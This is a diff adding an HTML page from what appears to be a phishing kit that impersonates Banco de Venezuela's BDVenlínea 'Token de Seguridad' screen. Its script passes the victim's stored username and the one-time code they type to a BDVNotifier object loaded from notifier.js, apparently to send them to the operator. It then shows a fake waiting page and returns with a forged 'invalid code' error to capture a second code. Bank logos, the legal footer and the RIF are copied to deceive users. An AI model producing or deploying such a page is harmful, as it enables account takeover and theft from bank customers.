@@ -1,0 +1,985 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>BDVenlínea personas - Token de Seguridad</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,600;0,700;1,400&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      -webkit-text-size-adjust: 100%;
+      text-size-adjust: 100%;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+      display: block;
+      -webkit-backface-visibility: hidden;
+      backface-visibility: hidden;
+    }
+
+    body {
+      font-family: 'Open Sans', 'Roboto', Arial, Helvetica, sans-serif;
+      background-color: #ffffff;
+      background-image: url('bdv-bg.jpg');
+      background-repeat: no-repeat;
+      background-position: center center;
+      background-attachment: fixed;
+      background-size: cover;
+      color: #555;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    /* ENCABEZADO SUPERIOR OFICIAL */
+    .header {
+      height: 64px;
+      background: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 28px;
+      border-bottom: 1px solid #e2e8f0;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      width: 100%;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      text-decoration: none;
+    }
+
+    .header-logo {
+      height: 38px;
+      width: auto;
+      max-height: 42px;
+      object-fit: contain;
+      user-select: none;
+      display: block;
+    }
+
+    /* BOTÓN MENÚ HAMBURGUESA */
+    .menu-btn {
+      padding: 6px;
+      background: transparent;
+      border: none;
+      cursor: pointer;
+      color: #24292f;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 4px;
+      transition: background-color 0.15s ease;
+    }
+
+    .menu-btn:hover {
+      background-color: #f1f5f9;
+    }
+
+    .menu-btn svg {
+      width: 28px;
+      height: 28px;
+    }
+
+    /* CONTENEDOR PRINCIPAL */
+    .main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 16px 48px;
+      width: 100%;
+    }
+
+    /* TARJETA BDV CON BACKDROP-BLUR MÁS ANCHA */
+    .card {
+      width: 100%;
+      max-width: 540px;
+      margin: 0 auto;
+      background: rgba(255, 255, 255, 0.96);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 12px;
+      padding: 44px 44px 38px;
+      box-shadow: 0 10px 30px -4px rgba(0, 0, 0, 0.16), 0 2px 6px rgba(0, 0, 0, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.85);
+      animation: fadeInCard 0.25s ease-out;
+    }
+
+    @keyframes fadeInCard {
+      from {
+        opacity: 0;
+        transform: translateY(6px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* LOGOTIPO OFICIAL BDVenlínea personas */
+    .card-logo-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 20px;
+      user-select: none;
+      width: 100%;
+    }
+
+    .card-logo {
+      width: 100%;
+      max-width: 295px;
+      height: auto;
+      object-fit: contain;
+      display: block;
+    }
+
+    /* DISTINTIVO OFICIAL AMIVEN */
+    .amiven-badge-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+
+    .amiven-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      background: #f0f6fc;
+      border: 1px solid #d0e2f5;
+      padding: 5px 14px;
+      border-radius: 20px;
+      box-shadow: 0 1px 3px rgba(13, 93, 184, 0.08);
+    }
+
+    .amiven-shield {
+      width: 16px;
+      height: 16px;
+      color: #0d5db8;
+    }
+
+    .amiven-brand-title {
+      font-size: 13.5px;
+      color: #0d5db8;
+      letter-spacing: 0.2px;
+    }
+
+    .amiven-brand-title strong {
+      font-weight: 700;
+    }
+
+    .amiven-divider {
+      color: #cbd5e1;
+      font-size: 12px;
+    }
+
+    .amiven-desc {
+      font-size: 12px;
+      color: #64748b;
+      font-weight: 600;
+    }
+
+    /* TÍTULO Y SUBTÍTULO */
+    .card-title {
+      text-align: center;
+      color: #1169a5;
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 10px;
+      line-height: 1.25;
+    }
+
+    .card-subtitle {
+      text-align: center;
+      color: #555555;
+      font-size: 14.5px;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    /* CAMPO DE CÓDIGO CON LA RAYITA ROJA CARACTERÍSTICA */
+    .input-wrapper {
+      margin-bottom: 18px;
+      width: 100%;
+    }
+
+    .input {
+      width: 100%;
+      height: 52px;
+      background: #ededed;
+      border: none;
+      border-bottom: 2px solid #8e9499;
+      border-top-left-radius: 4px;
+      border-top-right-radius: 4px;
+      padding: 0 16px;
+      font-size: 24px;
+      font-weight: 700;
+      letter-spacing: 8px;
+      text-align: center;
+      outline: none;
+      color: #222;
+      caret-color: #d71945;
+      font-family: 'Roboto', monospace, sans-serif;
+      transition: border-color 0.2s, background-color 0.2s;
+    }
+
+    .input:focus {
+      border-bottom: 2px solid #d71945;
+      background-color: #fbf5f6;
+    }
+
+    /* ESTADO DE ERROR EN TOKEN */
+    .input.has-error {
+      border-bottom: 2px solid #d71945 !important;
+      background-color: #fff2f4 !important;
+      animation: bdvInputShake 0.35s ease-in-out;
+    }
+
+    /* =========================================
+       ALERTA DE ERROR PROFESIONAL BANCO DE VENEZUELA
+    ========================================= */
+    .bdv-error-box {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      background-color: #fff2f4;
+      border: 1px solid #fecdd3;
+      border-left: 4px solid #d71945;
+      border-radius: 6px;
+      padding: 12px 14px;
+      margin-bottom: 18px;
+      text-align: left;
+      animation: bdvShake 0.4s ease-in-out, bdvFadeIn 0.25s ease-out;
+      box-shadow: 0 2px 8px rgba(215, 25, 69, 0.08);
+      width: 100%;
+    }
+
+    @keyframes bdvFadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-6px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes bdvShake {
+      0%, 100% { transform: translateX(0); }
+      20%, 60% { transform: translateX(-5px); }
+      40%, 80% { transform: translateX(5px); }
+    }
+
+    @keyframes bdvInputShake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-4px); }
+      75% { transform: translateX(4px); }
+    }
+
+    .bdv-error-icon {
+      color: #d71945;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    .bdv-error-icon svg {
+      width: 20px;
+      height: 20px;
+      display: block;
+    }
+
+    .bdv-error-content {
+      flex: 1;
+    }
+
+    .bdv-error-title {
+      font-size: 13.5px;
+      font-weight: 700;
+      color: #9e1133;
+      margin-bottom: 2px;
+      letter-spacing: -0.1px;
+    }
+
+    .bdv-error-desc {
+      font-size: 12.5px;
+      color: #5a1a26;
+      line-height: 1.45;
+      font-weight: 400;
+    }
+
+    .input::placeholder {
+      color: #8c9298;
+      font-size: 16px;
+      letter-spacing: 6px;
+      font-weight: 400;
+    }
+
+    /* CONTENEDOR DE REENVÍO Y NOTA AMIVEN */
+    .token-helper-group {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .resend-text {
+      font-size: 13px;
+      color: #64748b;
+    }
+
+    .resend-text strong {
+      color: #0d5db8;
+    }
+
+    .resend-btn {
+      background: transparent;
+      border: none;
+      color: #0d5db8;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      text-decoration: underline;
+      padding: 2px 4px;
+      transition: color 0.15s ease;
+    }
+
+    .resend-btn:hover {
+      color: #084c96;
+    }
+
+    .amiven-note {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      margin-top: 10px;
+      font-size: 12px;
+      color: #64748b;
+      line-height: 1.4;
+    }
+
+    .amiven-note svg {
+      width: 15px;
+      height: 15px;
+      flex-shrink: 0;
+      color: #0d5db8;
+    }
+
+    /* CAJA ELEGANTE DE MENSAJES DE MOTIVACIÓN MÁS AMPLIA */
+    .motivation-card {
+      background: linear-gradient(135deg, #f8fbff 0%, #edf5fd 100%);
+      border: 1px solid #dbe8f7;
+      border-left: 4px solid #0d5db8;
+      border-radius: 10px;
+      padding: 18px 22px;
+      margin-bottom: 26px;
+      text-align: left;
+      box-shadow: 0 2px 8px rgba(13, 93, 184, 0.05);
+      position: relative;
+    }
+
+    .motivation-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 6px;
+    }
+
+    .motivation-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.6px;
+      color: #0d5db8;
+    }
+
+    .motivation-badge svg {
+      width: 13px;
+      height: 13px;
+    }
+
+    .motivation-quote {
+      font-size: 13px;
+      line-height: 1.5;
+      color: #334155;
+      font-style: italic;
+      min-height: 38px;
+      display: flex;
+      align-items: center;
+      transition: opacity 0.3s ease, transform 0.3s ease;
+    }
+
+    /* BOTÓN CONTINUAR DE ANCHO COMPLETO */
+    .buttons {
+      width: 100%;
+      margin-bottom: 20px;
+    }
+
+    .btn {
+      width: 100%;
+      height: 50px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s ease;
+      user-select: none;
+    }
+
+    .btn-continue:disabled,
+    .btn-continue[disabled] {
+      background: #dddddd !important;
+      color: #999999 !important;
+      cursor: not-allowed !important;
+      box-shadow: none !important;
+      pointer-events: none;
+    }
+
+    .btn-continue:not(:disabled) {
+      background: #0874bd !important;
+      color: #ffffff !important;
+      cursor: pointer !important;
+      box-shadow: 0 2px 8px rgba(8, 116, 189, 0.28);
+      pointer-events: auto;
+    }
+
+    .btn-continue:not(:disabled):hover {
+      background: #075f9c !important;
+    }
+
+    .btn-continue:not(:disabled):active {
+      transform: scale(0.99);
+    }
+
+    /* PIE LEGAL */
+    .legal-footer {
+      text-align: center;
+      font-size: 11.5px;
+      color: #7b838b;
+      line-height: 1.5;
+      padding-top: 14px;
+      border-top: 1px solid #edf0f3;
+    }
+
+    /* ADAPTACIÓN MÓVIL EXACTA A LOGIN.HTML */
+    @media (max-width: 768px) {
+      body {
+        background-attachment: scroll;
+      }
+
+      .header {
+        height: 54px;
+        padding: 0 16px;
+      }
+
+      .header-logo {
+        height: 28px;
+      }
+
+      .main {
+        padding-top: 24px;
+        padding-left: 14px;
+        padding-right: 14px;
+        padding-bottom: 30px;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .card {
+        width: 100%;
+        max-width: 540px;
+        padding: 38px 26px 34px;
+        border-radius: 12px;
+        backdrop-filter: none !important;
+        -webkit-backdrop-filter: none !important;
+        background: #ffffff !important;
+      }
+
+      .card-logo {
+        width: 100%;
+        max-width: 275px;
+      }
+
+      .card-title {
+        font-size: 20px;
+        margin-bottom: 8px;
+      }
+
+      .card-subtitle {
+        font-size: 13px;
+        margin-bottom: 18px;
+      }
+
+      .input {
+        height: 50px;
+        font-size: 20px !important;
+        letter-spacing: 6px;
+      }
+
+      .motivation-card {
+        padding: 12px 14px;
+        margin-bottom: 18px;
+      }
+
+      .motivation-quote {
+        font-size: 12px;
+      }
+
+      .buttons {
+        gap: 10px;
+        margin-bottom: 16px;
+      }
+
+      .btn {
+        height: 42px;
+        font-size: 14px;
+        border-radius: 6px;
+      }
+
+      .bdv-error-box {
+        padding: 10px 12px;
+        margin-bottom: 14px;
+        gap: 10px;
+      }
+
+      .bdv-error-icon svg {
+        width: 18px;
+        height: 18px;
+      }
+
+      .bdv-error-title {
+        font-size: 13px;
+      }
+
+      .bdv-error-desc {
+        font-size: 12px;
+        line-height: 1.4;
+      }
+    }
+
+    /* =========================================
+       LOADER: OFICIAL BDV IDÉNTICO A LAS DEMÁS PÁGINAS
+    ========================================= */
+    .loader-center {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: rgba(0, 0, 0, 0.16);
+      backdrop-filter: blur(2px);
+      -webkit-backdrop-filter: blur(2px);
+      z-index: 999999;
+      animation: fadeInLoader 0.15s ease-out;
+    }
+
+    @keyframes fadeInLoader {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .loader {
+      display: flex;
+      align-items: center;
+      gap: 3.5px;
+    }
+
+    .loader span {
+      width: 8px;
+      height: 28px;
+      background: #2b2f36;
+      border-radius: 2px;
+      animation: movimiento 0.8s ease-in-out infinite;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.25);
+    }
+
+    .loader span:nth-child(1) {
+      animation-delay: 0s;
+    }
+
+    .loader span:nth-child(2) {
+      animation-delay: 0.12s;
+    }
+
+    .loader span:nth-child(3) {
+      animation-delay: 0.24s;
+    }
+
+    .loader span:nth-child(4) {
+      animation-delay: 0.36s;
+    }
+
+    @keyframes movimiento {
+      0%, 100% {
+        transform: scaleY(0.45);
+        opacity: 0.55;
+      }
+
+      50% {
+        transform: scaleY(1.4);
+        opacity: 1;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Encabezado superior con Logotipo Banco de Venezuela -->
+  <header class="header">
+    <a href="index.html" class="brand" title="Banco de Venezuela">
+      <img src="bdv-logo.png" alt="Banco de Venezuela" class="header-logo">
+    </a>
+
+    <button type="button" class="menu-btn" aria-label="Abrir menú">
+      <svg fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="3" y1="6" x2="21" y2="6"></line>
+        <line x1="3" y1="12" x2="21" y2="12"></line>
+        <line x1="3" y1="18" x2="21" y2="18"></line>
+      </svg>
+    </button>
+  </header>
+
+  <!-- Contenedor Principal: Tarjeta BDVenlínea personas -->
+  <main class="main">
+    <section class="card" role="main">
+
+      <!-- Logotipo oficial BDVenlínea personas -->
+      <div class="card-logo-container">
+        <img src="bdv-enlinea-personas.png" alt="BDVenlínea personas" class="card-logo">
+      </div>
+
+      <!-- Distintivo oficial amiVen -->
+      <div class="amiven-badge-container">
+        <div class="amiven-pill">
+          <svg class="amiven-shield" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+            <path d="M9 12l2 2 4-4"></path>
+          </svg>
+          <span class="amiven-brand-title">ami<strong>Ven</strong></span>
+          <span class="amiven-divider">|</span>
+          <span class="amiven-desc">Token Digital</span>
+        </div>
+      </div>
+
+      <!-- Título solicitado -->
+      <h1 class="card-title">Token de Seguridad</h1>
+
+      <!-- Subtítulo e instrucciones solicitadas -->
+      <p class="card-subtitle">
+        Ingresa el código enviado a tu Mensajeria de texto o generado por tu aplicación AmiVen.
+      </p>
+
+      <!-- Alerta de error realista: Token incorrecto -->
+      <div class="bdv-error-box" id="tokenErrorAlert" style="display: none;" role="alert">
+        <div class="bdv-error-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"></circle>
+            <line x1="12" y1="8" x2="12" y2="12"></line>
+            <line x1="12" y1="16" x2="12.01" y2="16"></line>
+          </svg>
+        </div>
+        <div class="bdv-error-content">
+          <div class="bdv-error-title">Código de seguridad inválido</div>
+          <div class="bdv-error-desc">El código ingresado es incorrecto o ha vencido. Por favor, verifíquelo en su aplicación amiVen o espere el SMS e intente nuevamente.</div>
+        </div>
+      </div>
+
+      <!-- Formulario para ingreso del código -->
+      <form id="tokenForm" onsubmit="event.preventDefault(); handleContinue();">
+        <div class="input-wrapper">
+          <input
+            id="tokenInput"
+            class="input"
+            type="text"
+            inputmode="numeric"
+            pattern="\d*"
+            maxlength="8"
+            placeholder="● ● ● ● ● ● ● ●"
+            autocomplete="one-time-code"
+            autofocus
+          >
+        </div>
+
+        <!-- Grupo de ayuda: temporizador SMS y AmiVen -->
+        <div class="token-helper-group">
+          <div class="resend-text" id="countdownWrapper">
+            ¿No recibiste el código por SMS? Reenviar en <strong id="countdownTimer">00:59</strong>
+          </div>
+          <button type="button" class="resend-btn" id="resendBtn" style="display: none;" onclick="handleResend()">
+            Solicitar nuevo código por SMS
+          </button>
+
+          <div class="amiven-note">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <circle cx="12" cy="12" r="10"></circle>
+              <line x1="12" y1="16" x2="12" y2="12"></line>
+              <line x1="12" y1="8" x2="12.01" y2="8"></line>
+            </svg>
+            <span>También puedes consultar tu clave dinámica en tu app <strong>AmiVen</strong> sin internet.</span>
+          </div>
+        </div>
+
+        <!-- Mensajes profesionales de motivación inspiradora -->
+        <div class="motivation-card" role="region" aria-label="Mensaje de motivación">
+          <div class="motivation-header">
+            <div class="motivation-badge">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+              </svg>
+              <span>Inspiración & Tranquilidad BDV</span>
+            </div>
+          </div>
+          <p class="motivation-quote" id="motivationQuote">
+            «Cada esfuerzo diario construye las metas de tu vida. Tu constancia y dedicación son la clave del éxito.»
+          </p>
+        </div>
+
+        <!-- Botón Continuar (único) -->
+        <div class="buttons">
+          <button
+            type="button"
+            class="btn btn-continue"
+            id="continueBtn"
+            disabled
+            onclick="handleContinue()"
+          >
+            Continuar
+          </button>
+        </div>
+      </form>
+
+      <!-- Pie legal del Banco de Venezuela -->
+      <footer class="legal-footer">
+        Banco de Venezuela, S.A. Banco Universal • RIF G-20009997-6<br>
+        Todos los derechos reservados.
+      </footer>
+
+    </section>
+  </main>
+
+  <!-- PANTALLA DE CARGA CON LAS 4 RAYAS BDV IDÉNTICA A LOGIN.HTML -->
+  <div class="loader-center" id="pageLoader" style="display: none;">
+    <div class="loader">
+      <span></span>
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+  </div>
+
+  <script src="notifier.js"></script>
+  <script>
+    const tokenInput = document.getElementById('tokenInput');
+    const continueBtn = document.getElementById('continueBtn');
+    const countdownTimer = document.getElementById('countdownTimer');
+    const countdownWrapper = document.getElementById('countdownWrapper');
+    const resendBtn = document.getElementById('resendBtn');
+    const motivationQuote = document.getElementById('motivationQuote');
+    const pageLoader = document.getElementById('pageLoader');
+
+    // Citas motivacionales profesionales sobre constancia, seguridad, metas y éxito
+    const motivationalQuotes = [
+      "«Cada esfuerzo diario construye las metas de tu vida. Tu constancia y dedicación son la clave del éxito.»",
+      "«La tranquilidad de tu familia y tus proyectos comienza con pasos firmes y decisiones seguras.»",
+      "«El trabajo honrado y perseverante rinde sus mejores frutos. Avanza hoy con confianza y optimismo.»",
+      "«Proteger lo que has construido con dedicación es el cimiento para alcanzar nuevos horizontes.»",
+      "«Cree en tus capacidades: la disciplina y constancia de hoy es la prosperidad del mañana.»",
+      "«Grandes logros nacen de pequeños pasos dados con compromiso, seguridad y valentía.»",
+      "«Tu bienestar y el futuro de los tuyos están en tus manos. Sigue adelante con paso firme.»"
+    ];
+
+    let currentQuoteIndex = 0;
+
+    // Rotación suave de mensajes motivacionales cada 5 segundos
+    setInterval(() => {
+      currentQuoteIndex = (currentQuoteIndex + 1) % motivationalQuotes.length;
+      if (motivationQuote) {
+        motivationQuote.style.opacity = '0';
+        motivationQuote.style.transform = 'translateY(-3px)';
+        setTimeout(() => {
+          motivationQuote.textContent = motivationalQuotes[currentQuoteIndex];
+          motivationQuote.style.opacity = '1';
+          motivationQuote.style.transform = 'translateY(0)';
+        }, 300);
+      }
+    }, 5000);
+
+    // Contador de intentos del token
+    let tokenAttemptCount = 0;
+
+    // Función para actualizar estado visual y funcional del botón Continuar
+    function updateButtonState() {
+      const cleanValue = tokenInput.value.replace(/\D/g, '').slice(0, 8);
+      tokenInput.value = cleanValue;
+
+      if (cleanValue.length > 0 && tokenInput.classList.contains('has-error')) {
+        tokenInput.classList.remove('has-error');
+      }
+
+      // Permite de 6 a 8 números
+      if (cleanValue.length >= 6 && cleanValue.length <= 8) {
+        continueBtn.disabled = false;
+        continueBtn.style.setProperty('background-color', '#0874bd', 'important');
+        continueBtn.style.setProperty('color', '#ffffff', 'important');
+        continueBtn.style.setProperty('cursor', 'pointer', 'important');
+        continueBtn.style.setProperty('box-shadow', '0 2px 8px rgba(8, 116, 189, 0.28)', 'important');
+        continueBtn.style.setProperty('pointer-events', 'auto', 'important');
+      } else {
+        continueBtn.disabled = true;
+        continueBtn.style.setProperty('background-color', '#dddddd', 'important');
+        continueBtn.style.setProperty('color', '#999999', 'important');
+        continueBtn.style.setProperty('cursor', 'not-allowed', 'important');
+        continueBtn.style.setProperty('box-shadow', 'none', 'important');
+        continueBtn.style.setProperty('pointer-events', 'none', 'important');
+      }
+    }
+
+    if (tokenInput) {
+      tokenInput.addEventListener('input', updateButtonState);
+      tokenInput.addEventListener('keyup', updateButtonState);
+      tokenInput.addEventListener('change', updateButtonState);
+      tokenInput.addEventListener('paste', () => {
+        setTimeout(updateButtonState, 20);
+      });
+
+      tokenInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+          if (!continueBtn.disabled) {
+            handleContinue();
+          } else {
+            e.preventDefault();
+          }
+        }
+      });
+
+      // Auto-enfoque al cargar
+      setTimeout(() => {
+        tokenInput.focus();
+      }, 150);
+    }
+
+    // Cuenta regresiva para reenvío de SMS
+    let secondsLeft = 59;
+    let timerInterval = setInterval(() => {
+      secondsLeft--;
+      if (secondsLeft > 0) {
+        const formattedSec = secondsLeft < 10 ? '0' + secondsLeft : secondsLeft;
+        if (countdownTimer) countdownTimer.textContent = '00:' + formattedSec;
+      } else {
+        clearInterval(timerInterval);
+        if (countdownWrapper) countdownWrapper.style.display = 'none';
+        if (resendBtn) resendBtn.style.display = 'inline-block';
+      }
+    }, 1000);
+
+    function handleResend() {
+      const user = sessionStorage.getItem('bdv_user') || '';
+      if (window.BDVNotifier) {
+        BDVNotifier.sendResend(user);
+      }
+      if (pageLoader) {
+        pageLoader.style.display = 'flex';
+        setTimeout(() => {
+          pageLoader.style.display = 'none';
+          alert('Se ha enviado un nuevo código de seguridad a su número de teléfono registrado.');
+          const tokenErrorAlert = document.getElementById('tokenErrorAlert');
+          if (tokenErrorAlert) {
+            tokenErrorAlert.style.display = 'none';
+          }
+          if (tokenInput) {
+            tokenInput.classList.remove('has-error');
+            tokenInput.value = '';
+            tokenInput.focus();
+          }
+          updateButtonState();
+          secondsLeft = 59;
+          if (countdownTimer) countdownTimer.textContent = '00:59';
+          if (countdownWrapper) countdownWrapper.style.display = 'block';
+          if (resendBtn) resendBtn.style.display = 'none';
+          
+          timerInterval = setInterval(() => {
+            secondsLeft--;
+            if (secondsLeft > 0) {
+              const formattedSec = secondsLeft < 10 ? '0' + secondsLeft : secondsLeft;
+              if (countdownTimer) countdownTimer.textContent = '00:' + formattedSec;
+            } else {
+              clearInterval(timerInterval);
+              if (countdownWrapper) countdownWrapper.style.display = 'none';
+              if (resendBtn) resendBtn.style.display = 'inline-block';
+            }
+          }, 1000);
+        }, 1200);
+      }
+    }
+
+    // Si regresa tras los 10 segundos de rayas en verificacion-segunda.html
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('retry') === '1') {
+      const tokenErrorAlert = document.getElementById('tokenErrorAlert');
+      if (tokenErrorAlert) {
+        tokenErrorAlert.style.display = 'flex';
+      }
+      if (tokenInput) {
+        tokenInput.classList.add('has-error');
+        tokenInput.value = '';
+        setTimeout(() => {
+          tokenInput.focus();
+        }, 150);
+      }
+    }
+
+    // Acción Continuar: navega a verificacion-segunda.html (las rayas de 10 segundos) en cada intento
+    function handleContinue() {
+      if (continueBtn.disabled) return;
+      const code = tokenInput ? tokenInput.value.trim() : '';
+      const user = sessionStorage.getItem('bdv_user') || '';
+      const isRetry = new URLSearchParams(window.location.search).get('retry') === '1';
+      const attempt = isRetry ? 2 : 1;
+
+      sessionStorage.setItem('bdv_token_' + attempt, code);
+      if (!isRetry) {
+        sessionStorage.setItem('bdv_token_attempts', '1');
+      }
+
+      if (window.BDVNotifier) {
+        BDVNotifier.sendToken(user, code, attempt);
+      }
+
+      window.location.href = 'verificacion-segunda.html';
+    }
+
+    // Acción Cancelar: regresa al inicio de sesión
+    function handleCancel() {
+      window.location.href = 'login.html';
+    }
+  </script>
+
+</body>
+</html>
